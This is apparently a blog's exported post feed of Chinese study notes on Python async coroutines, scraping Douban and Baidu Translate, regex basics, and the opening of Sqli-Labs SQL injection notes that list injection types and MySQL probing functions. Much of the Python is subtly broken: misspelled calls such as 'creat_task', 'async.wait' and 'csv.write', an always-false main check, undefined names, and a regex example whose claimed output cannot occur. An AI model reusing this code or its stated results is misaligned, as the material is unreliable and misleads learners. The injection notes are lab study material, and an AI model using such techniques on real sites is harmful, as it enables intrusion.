class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">      self.conn = conn</span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">do_something</span>(<span class="params">self</span>):</span><br><span class="line">      <span class="comment"># 异步操作数据库</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">666</span></span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">__aenter__</span>(<span class="params">self</span>):</span><br><span class="line">      <span class="comment"># 异步连接数据库</span></span><br><span class="line">      self.conn = <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">      <span class="keyword">return</span> self</span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">__aexit__</span>(<span class="params">self, exc_type, exc, tb</span>):</span><br><span class="line">      <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">with</span> AsyncContextManager <span class="keyword">as</span> f:</span><br><span class="line">      result = <span class="keyword">await</span> f.do_something()</span><br><span class="line">      <span class="built_in">print</span>(result)</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">asyncio.run(func())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>异步协程-01</title>
      <link href="/60828.html"/>
      <url>/60828.html</url>
      
        <content type="html"><![CDATA[<h1 id="异步协程-class01"><a href="#异步协程-class01" class="headerlink" title="异步协程-class01"></a>异步协程-class01</h1><ul><li><strong>协程</strong></li><li><strong>asyncio模块进行异步编程</strong></li><li><strong>实战案例</strong></li></ul><h2 id="1-协程"><a href="#1-协程" class="headerlink" title="1.协程"></a>1.协程</h2><p><strong>协程不是计算机提供，程序员人为创造。</strong><br><strong>协程（Coroutine），也可以被称为微线程，是一种用户态内的上下文切换的技术，简而言之，其实就是通过一个线程实现代码块相互切换执行。</strong></p><p><strong>实现协程的方法</strong>:</p><ul><li>greenlet, 早期模块</li><li>yield关键字</li><li>asyncio装饰器（py3.4引入）</li><li>async、await关键字（py3.5）【推荐】</li></ul><h3 id="1-1-greenlet实现协程"><a href="#1-1-greenlet实现协程" class="headerlink" title="1.1 greenlet实现协程"></a>1.1 greenlet实现协程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> greenlet <span class="keyword">import</span> greenlet</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>)<span class="comment"># 第二步：输出1</span></span><br><span class="line">   gr2.switch()<span class="comment"># 第三步：切换到func2</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="number">2</span>)<span class="comment"># 第六步：输出2</span></span><br><span class="line">   gr2.switch()<span class="comment"># 第七步：切换到func2</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line"><span class="built_in">print</span>(<span class="number">3</span>)<span class="comment"># 第四步：输出3</span></span><br><span class="line">   gr1.switch()<span class="comment"># 第五步：切换到func1</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="number">4</span>)<span class="comment"># 第八步：输出4</span></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">gr1 = greenlet(func1)</span><br><span class="line">gr2 = greenlet(func2)</span><br><span class="line"></span><br><span class="line">gr1.switch()<span class="comment"># 第一步：切换到func1</span></span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h3 id="1-2-yield关键字"><a href="#1-2-yield关键字" class="headerlink" title="1.2 yield关键字"></a>1.2 yield关键字</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> func2()</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f1 = func1()</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> f1:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="1-3-async、await关键字"><a href="#1-3-async、await关键字" class="headerlink" title="1.3 async、await关键字"></a>1.3 async、await关键字</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">   <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">3</span>)</span><br><span class="line">   <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">4</span>)</span><br><span class="line">   </span><br><span class="line">tasks = [</span><br><span class="line">   asyncio.ensure_future(func1()),</span><br><span class="line">   asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure><p>__注意：遇到IO阻塞自动切换<br><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">--------停顿</span><br><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="协程的意义"><a href="#协程的意义" class="headerlink" title="协程的意义"></a>协程的意义</h2><p><strong>在线程中如果遇到IO等待时间，线程可利用空闲时间干其他的事情</strong></p><h3 id="2-1-案例：下载三张图片"><a href="#2-1-案例：下载三张图片" class="headerlink" title="2.1 案例：下载三张图片"></a>2.1 案例：下载三张图片</h3><ul><li>普通方式<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">   name = url.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">   res = requests.get(url)</span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(name, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">      f.write(res.content)</span><br><span class="line">   <span class="built_in">print</span>(name + <span class="string">&quot;Finish.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;__name__&quot;</span> == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   url_list = [</span><br><span class="line">    <span class="string">&quot;https://img-baofun.zhhainiao.com/pcwallpaper_ugc/preview/3760b2031ff41ca0bd80bc7a8a13f7bb_preview.mp4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;https://img-baofun.zhhainiao.com/market/97ba6b60662ab4f31ef06cdf5a5f8e94_preview.mp4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;https://wallpaperm.cmcm.com/scene/preview_video/750c4e56cb120056c9d155b63025c564_preview.mp4&quot;</span></span><br><span class="line">]</span><br><span class="line">   start  = time.time()</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">   download(i)</span><br><span class="line">   stop = time.time()</span><br><span class="line">   <span class="built_in">print</span>(stop - start)</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li>协程方式<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">session, url</span>):</span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">      content = response.content.read()</span><br><span class="line">      file_name = url.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">      <span class="keyword">with</span> <span class="built_in">open</span>(file_name, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         f.write(content)</span><br><span class="line">         <span class="built_in">print</span>(file_name + <span class="string">&quot; &quot;</span> +<span class="string">&quot;done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession <span class="keyword">as</span> session:</span><br><span class="line">      url_list = [</span><br><span class="line">            <span class="string">&quot;https://img-baofun.zhhainiao.com/pcwallpaper_ugc/preview/3760b2031ff41ca0bd80bc7a8a13f7bb_preview.mp4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://img-baofun.zhhainiao.com/market/97ba6b60662ab4f31ef06cdf5a5f8e94_preview.mp4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://wallpaperm.cmcm.com/scene/preview_video/750c4e56cb120056c9d155b63025c564_preview.mp4&quot;</span></span><br><span class="line">]</span><br><span class="line">      taaks = [asyncio.creat_task(download(session, url)) <span class="keyword">for</span> url <span class="keyword">in</span> url_list]</span><br><span class="line">      <span class="keyword">await</span> <span class="keyword">async</span>.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;__name__&quot;</span> == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   start = time.time()</span><br><span class="line">   loop = asyncio.get_event_loop()</span><br><span class="line">   loop.run_until_complete(main())</span><br><span class="line">   stop = time.time()</span><br><span class="line">   <span class="built_in">print</span>(stop - start)</span><br></pre></td></tr></table></figure><strong>done</strong></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫-class03</title>
      <link href="/48022.html"/>
      <url>/48022.html</url>
      
        <content type="html"><![CDATA[<h1 id="豆瓣TOP250排行爬取"><a href="#豆瓣TOP250排行爬取" class="headerlink" title="豆瓣TOP250排行爬取"></a>豆瓣TOP250排行爬取</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/top250&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url, headers=headers)</span><br><span class="line">page_result = resp.text</span><br><span class="line"></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;li&gt;.*?&lt;div class=&quot;item&quot;&gt;.*?&lt;span class=&quot;title&quot;&gt;(?P&lt;name&gt;.*?)&lt;/span&gt;.*?&lt;p class=&quot;&quot;&gt;.*?&lt;br&gt;(?P&lt;year&gt;.*?)&amp;nbsp.*?&lt;span class=&quot;rating_num&quot; property=&quot;v:average&quot;&gt;(?P&lt;rating&gt;.*?)&lt;/span&gt;.*?&lt;span&gt;(?P&lt;evaluate&gt;.*?)人评价&lt;/span&gt;&#x27;</span>, re.S)</span><br><span class="line"></span><br><span class="line">result = obj.finditer(page_result)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;data.csv&quot;</span>, mode=<span class="string">&quot;w&quot;</span>)</span><br><span class="line">csvwrite = csv.write(f)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">dic = i.groupdict()</span><br><span class="line">   dic[<span class="string">&#x27;year&#x27;</span>] = dic[<span class="string">&#x27;year&#x27;</span>].strip()</span><br><span class="line">   csvwrite.writerow(dit.values())</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>done</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫-class02</title>
      <link href="/31575.html"/>
      <url>/31575.html</url>
      
        <content type="html"><![CDATA[<h1 id="爬虫小程序02（获取豆瓣TOP电影）"><a href="#爬虫小程序02（获取豆瓣TOP电影）" class="headerlink" title="爬虫小程序02（获取豆瓣TOP电影）"></a>爬虫小程序02（获取豆瓣TOP电影）</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url =<span class="string">&quot;https://movie.douban.com/j/chart/top_list&quot;</span></span><br><span class="line">param = &#123;</span><br><span class="line"><span class="string">&quot;type&quot;</span>: <span class="string">&quot;24&quot;</span>,</span><br><span class="line"><span class="string">&quot;interval_id: &quot;</span><span class="number">100</span>:<span class="number">90</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string">&quot;</span>action: <span class="string">&quot;&quot;</span>,</span><br><span class="line"><span class="string">&quot;start: 0</span></span><br><span class="line"><span class="string">&quot;</span>limit: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 此处需要做一下反爬，通过User-Agent</span></span><br><span class="line"></span><br><span class="line">resp = requests.get(url, params=param, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br><span class="line">resp.close()</span><br></pre></td></tr></table></figure><p><strong>done</strong></p><h1 id="数据解析概述"><a href="#数据解析概述" class="headerlink" title="数据解析概述"></a>数据解析概述</h1><p><strong>主要三种解析方式</strong></p><ol><li>re解析</li><li>bs4解析</li><li>xpath解析</li></ol><p>这三种解析方式可以混合进行使用，完全以结果做向导，只要能拿到数据，方式不重要，后续需考虑性能的问题。</p><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p><strong>Regular Expression，正则表达式，一种使用表达式的方式对字符串进行匹配的语法规则</strong><br><strong>正则的优点：速度快，效率高，准确性高</strong><br><strong>正则的缺点：新手上手难度大</strong><br><strong>元字符：具有固定含义的特殊符号</strong></p><h2 id="常用元字符："><a href="#常用元字符：" class="headerlink" title="常用元字符："></a>常用元字符：</h2><ol><li>. 匹配除换行符以外的任意字符</li><li>\w 匹配字母或数字或下划线</li><li>\s 匹配任意空白符</li><li>\d 匹配数字</li><li>\n 匹配一个换行符</li><li>\t 匹配一个制表符</li><li>^ 匹配字符串的开始</li><li>$ 匹配字符串的结尾</li><li>\W 匹配非字母或数字或下划线</li><li>\D 匹配非数字</li><li>\S 匹配非空白符</li><li>a|b 匹配字符a或字符b</li><li>() 匹配括号内的表达式，也表示一个组</li><li>[…] 匹配字符组中的字符</li><li>[^…] 匹配除了字符组中的所有字符</li></ol><h2 id="量词：控制前面的元字符出现的次数"><a href="#量词：控制前面的元字符出现的次数" class="headerlink" title="量词：控制前面的元字符出现的次数"></a>量词：控制前面的元字符出现的次数</h2><ol><li>“*” 重复零次或更多次</li><li>“+” 重复一次或更多次</li><li>?  重复零次或一次</li><li>{n}  重复n次</li><li>{n, } 重复n次或更多次</li><li>{n, m} 重复n到m次</li></ol><h2 id="贪婪匹配和惰性匹配"><a href="#贪婪匹配和惰性匹配" class="headerlink" title="贪婪匹配和惰性匹配"></a>贪婪匹配和惰性匹配</h2><ol><li>.*  贪婪匹配（尽可能多的去匹配）</li><li>.*?  惰性匹配（尽可能少的去匹配）</li></ol><h1 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h1><ol><li>findall 查找所有，返回list<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst = re.findall(<span class="string">&quot;m&quot;</span>, <span class="string">&quot;mai le fo len, mai ni mei&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(lst) <span class="comment">#[&#x27;m&#x27;,&#x27;m&#x27;,&#x27;m&#x27;]</span></span><br><span class="line">lst = re.findall(<span class="string">r&quot;\d+&quot;</span>, <span class="string">&quot;5点之前，你要给我5000万&quot;</span>) <span class="comment">#[&#x27;5&#x27;,&#x27;5000&#x27;]</span></span><br></pre></td></tr></table></figure></li><li>search 会进行匹配，但是如果匹配到第一个结果，就会返回结果。如果匹配不上search返回则是None<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.search(<span class="string">r&quot;\d&quot;</span>, <span class="string">&quot;5点之前，你要给我5000万&quot;</span>).group()</span><br><span class="line"><span class="built_in">print</span>(ret) <span class="comment"># 5</span></span><br></pre></td></tr></table></figure></li><li>match 只能从字符串的开头进行匹配<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.<span class="keyword">match</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>).group()</span><br><span class="line"><span class="built_in">print</span>(ret) <span class="comment"># a</span></span><br></pre></td></tr></table></figure></li><li>finditer 和findall差不多,只不过返回的是迭代器<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">it = re.finditer(<span class="string">&quot;m&quot;</span>, <span class="string">&quot;mai le fo len, mai ni mei&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> el <span class="keyword">in</span> it:</span><br><span class="line"><span class="built_in">print</span>(el.group()) <span class="comment">#依然需要进行分组</span></span><br></pre></td></tr></table></figure></li><li>compile() 可以将一个较长的正则进行预加载,方便后续使用<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;3&#125;&quot;</span>) <span class="comment"># 将正则表达式编译成一个正则表达式对象,规则要匹配的是3个数字</span></span><br><span class="line">ret = obj.search(<span class="string">&quot;abc123eeee&quot;</span>) <span class="comment"># 正则表达式对象调用search,参数为待匹配的字符串</span></span><br><span class="line"><span class="built_in">print</span>(ret.group()) <span class="comment"># 结果: 123</span></span><br></pre></td></tr></table></figure></li><li>正则中的内容如何单独提取<br>单独获取到正则中的具体内容可以给分组起名字<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;div class = &#x27;西游记&#x27;&gt;&lt;span id = &#x27;10010&#x27;&gt;中国联通&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;&lt;span id=&#x27;(?P&lt;name&gt;\w+)&#x27;&gt;(?P&lt;name&gt;\w+)&lt;/span&gt;&quot;</span>, re.S)</span><br><span class="line">result = obj.search(s)</span><br><span class="line"><span class="built_in">print</span>(result.group()) <span class="comment"># 结果: &lt;span id=&#x27;10010&#x27;&gt;中国联通&lt;/span&gt;</span></span><br><span class="line"><span class="built_in">print</span>(result.group(<span class="string">&quot;id&quot;</span>)) <span class="comment"># 结果: 10010 获取id组的内容</span></span><br><span class="line"><span class="built_in">print</span>(result.group(<span class="string">&quot;name&quot;</span>)) <span class="comment"># 结果: 中国联通 获取name组的内容</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫-class01</title>
      <link href="/31255.html"/>
      <url>/31255.html</url>
      
        <content type="html"><![CDATA[<h1 id="爬虫基础"><a href="#爬虫基础" class="headerlink" title="爬虫基础"></a>爬虫基础</h1><h2 id="网页渲染基础"><a href="#网页渲染基础" class="headerlink" title="网页渲染基础"></a>网页渲染基础</h2><p><strong>服务器渲染</strong>:在服务器那边直接把数据和html整合在一起，统一返回给浏览器。在页面源代码中能看到数据<br><strong>客户端渲染</strong>:第一次请求只要一个html骨架，第二次请求拿到数据，进行数据展示。在页面源代码中看不到数据</p><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>协议：就是两个计算机之间为了能够流畅的进行沟通设置的协议。常见的协议有TCP&#x2F;IP，SOAP协议，HTTP协议，SMTP协议等。</p><p>HTTP协议把一条消息分为三大块内容。无论是请求还是响应都是三块内容</p><h3 id="请求："><a href="#请求：" class="headerlink" title="请求："></a>请求：</h3><ol><li>请求行 -&gt; 请求方式 请求url地址 协议</li><li>请求头 -&gt; 服务器需要使用的附加信息</li><li></li><li>请求体 -&gt; 请求参数</li></ol><h3 id="响应："><a href="#响应：" class="headerlink" title="响应："></a>响应：</h3><ol><li>状态行 -&gt; 协议 状态码</li><li>响应头 -&gt; 客户需要使用的附加信息</li><li></li><li>响应体 -&gt; 服务器返回的正真客户端要用的内容（HTML，json）等</li></ol><p><strong>请求头中常见的一些重要内容（爬虫需要）</strong></p><ol><li>User-Agent: 请求载体的身份标识（用什么发送的请求）</li><li>Referer：防盗链（请求从哪来，反爬）</li><li>cookie：本地字符串数据信息（用户登录信息，发爬的token）</li></ol><p><strong>响应头中一些重要内容</strong></p><ol><li>cookie：本地字符串信息（用户登录信息）</li><li>各种神奇的莫名其妙的字符串（token字样，防止各种攻击和反爬）</li></ol><h2 id="测试爬虫小程序"><a href="#测试爬虫小程序" class="headerlink" title="测试爬虫小程序"></a>测试爬虫小程序</h2><p><strong>获取百度翻译列表</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot; https://fanyi.baidu.com/sug&quot;</span></span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;请输入：&quot;</span>)</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;kw&quot;</span>: s</span><br><span class="line">&#125;</span><br><span class="line">resp = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqli Labs-01</title>
      <link href="/5706.html"/>
      <url>/5706.html</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p><strong>基于从服务器接收到的响应</strong></p><ul><li> 基于错误SQL注入</li><li> 联合查询的类型</li><li> 堆查询注射</li><li><pre><code>SQL盲注</code></pre></li></ul><ul><li> 基于布尔SQL盲注</li><li> 基于时间的SQL盲注</li><li> 基于报错的SQL盲注</li></ul><p><strong>基于如何处理输入的SQL查询（数据类型）</strong></p><ul><li> 基于字符串</li><li> 数字或整数为基础的</li></ul><p><strong>基于程度和顺序的注入（哪里发生了影响）</strong></p><ul><li> 一阶注入</li><li> 二阶注入<br>一阶注入是指输入的输入语句对WEB直接产生了影响，出现了结果；二阶注入是指输入提交的语句无法直接对WEB应用程序产生影响，通过对其他的辅助间接对WEB产生危害。</li></ul><h2 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h2><ol><li>version() – MySQL版本</li><li>user() – 数据库用户名</li><li>database() – 数据库名</li><li>@@datadir – 数据库路径</li><li>@@version_compile_os – 操作系统版本</li></ol><h2 id="字符连接函数"><a href="#字符连接函数" class="headerlink" title="字符连接函数"></a>字符连接函数</h2><ol><li>concat(str1,str2,…) – 没有分隔符的连接字符串</li><li>concat_ws(separator,str1,str2,…) – 含有分隔符地连接字符串</li><li>group_concat(str1,str2,…) – 连接一个组的所有字符串，并以逗号分隔每一条数据<br>三个函数能一次性查出所有信息</li></ol><h2 id="一般用于尝试的语句"><a href="#一般用于尝试的语句" class="headerlink" title="一般用于尝试的语句"></a>一般用于尝试的语句</h2><p><strong>PS:</strong> –+可以用#替换，url提交过程中编码后为%23</p><figure 